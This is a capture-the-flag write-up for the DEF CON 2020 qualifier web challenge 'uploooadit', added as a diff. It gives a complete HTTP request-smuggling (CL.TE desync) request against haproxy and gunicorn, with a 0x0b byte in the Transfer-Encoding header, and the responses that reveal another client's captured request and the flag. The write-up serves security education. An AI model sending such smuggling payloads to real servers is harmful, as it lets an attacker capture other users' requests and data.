@@ -1,0 +1,137 @@
+<h1>DEF CON CTF Qualifier 2020 – uploooadit</h1>
+
+<ul>
+<li><strong>Category:</strong> web</li>
+<li><strong>Points:</strong> 110</li>
+</ul>
+
+<h2>Challenge</h2>
+
+<blockquote>
+  <p>https://uploooadit.oooverflow.io/</p>
+  
+  <p>Files:</p>
+  
+  <p><a href="app.py">app.py</a> 358c19d6478e1f66a25161933566d7111dd293f02d9916a89c56e09268c2b54c</p>
+  
+  <p><a href="store.py">store.py</a> dd5cee877ee73966c53f0577dc85be1705f2a13f12eb58a56a500f1da9dc49c0</p>
+</blockquote>
+
+<p><a href="https://github.com/o-o-overflow/dc2020q-uploooadit">Official solution here.</a></p>
+
+<h2>Solution</h2>
+
+<p>With this web application you can submit a text content to a remote S3 bucket defining a GUID for the key and then retrieving the same text content via the GUID.</p>
+
+<p>The functionality endpoint is <code>/files/</code>. The GUID can be set with <code>X-guid</code> HTTP header.</p>
+
+<p>Analyzing the two given files (<a href="app.py">app.py</a> and <a href="store.py">store.py</a>) you can discover that no intended vulnerabilities are present.</p>
+
+<p>Analyzing responses, you can discover some interesting HTTP headers:
+* <code>Server</code>;
+* <code>Via</code>;
+* <code>X-Served-By</code>.</p>
+
+<p>```
+GET /files/00000000-0000-0666-1234-0000ffa20000 HTTP/1.1
+Host: uploooadit.oooverflow.io</p>
+
+<p>HTTP/1.1 404 NOT FOUND
+Server: gunicorn/20.0.0
+Date: Sat, 16 May 2020 13:20:13 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 232
+Via: haproxy
+X-Served-By: ip-10-0-0-183.us-east-2.compute.internal</p>
+
+<p><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<title>404 Not Found</title></p>
+
+<h1>Not Found</h1>
+
+<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
+
+<p>```</p>
+
+<p>It seems that the architecture is composed by a proxy (<code>haproxy</code> 1.9.10) and different hosts behind it (<code>gunicorn</code> 20.0.0) which run the application.</p>
+
+<p>Considering the infrastructure, this seems to be an <em><a href="https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn">HTTP Desync Attack</a> CL.TE</em> scenario.</p>
+
+<p>Other information can be found <a href="https://nathandavison.com/blog/haproxy-http-request-smuggling">here</a> and <a href="https://blog.deteact.com/gunicorn-http-request-smuggling/">here</a>.</p>
+
+<p>The malicious HTTP request will be the following (the char between <code>Transfer-Encoding:</code> and <code>chunked</code> is <code>0x0b</code>).</p>
+
+<p>```
+POST /files/ HTTP/1.1
+Host: uploooadit.oooverflow.io
+Content-Length: 175
+Content-type: text/plain
+Connection: keep-alive
+X-guid: 00000000-0000-0666-1234-0000ffa20000
+Transfer-Encoding:chunked</p>
+
+<p>0</p>
+
+<p>POST /files/ HTTP/1.1
+Host: uploooadit.oooverflow.io
+Connection: close
+x-guid: 00000000-0000-0666-1234-0000ffa20000
+Content-Type: text/plain
+Content-Length: 387</p>
+
+<p>A</p>
+
+<p>```</p>
+
+<p>Which will give the following answer.</p>
+
+<p>```
+HTTP/1.1 201 CREATED
+Server: gunicorn/20.0.0
+Date: Mon, 18 May 2020 00:31:05 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 0
+Via: haproxy
+X-Served-By: ip-10-0-1-95.us-east-2.compute.internal</p>
+
+<p>```</p>
+
+<p>At this point it is sufficient to read the defined object.</p>
+
+<p>```
+GET /files/00000000-0000-0666-1234-0000ffa20000 HTTP/1.1
+Host: uploooadit.oooverflow.io</p>
+
+<p>```</p>
+
+<p>Which will return a POST request containing the flag.</p>
+
+<p>```
+HTTP/1.1 200 OK
+Server: gunicorn/20.0.0
+Date: Mon, 18 May 2020 00:31:09 GMT
+Content-Type: text/plain
+Content-Length: 387
+Via: haproxy
+X-Served-By: ip-10-0-1-95.us-east-2.compute.internal</p>
+
+<p>APOST /files/ HTTP/1.1
+Host: 127.0.0.1:8080
+User-Agent: invoker
+Accept-Encoding: gzip, deflate
+Accept: <em>/</em>
+Content-Type: text/plain
+X-guid: b6e184e0-593e-4c5a-98da-0df304752a0e
+Content-Length: 152
+X-Forwarded-For: 127.0.0.1</p>
+
+<p>Congratulations!
+OOO{That girl thinks she's the queen of the neighborhood/She's got the hottest trike in town/That girl, she holds her head up so high}</p>
+
+<p>```</p>
+
+<p>The flag is the following.</p>
+
+<p><code>
+OOO{That girl thinks she's the queen of the neighborhood/She's got the hottest trike in town/That girl, she holds her head up so high}
+</code></p>
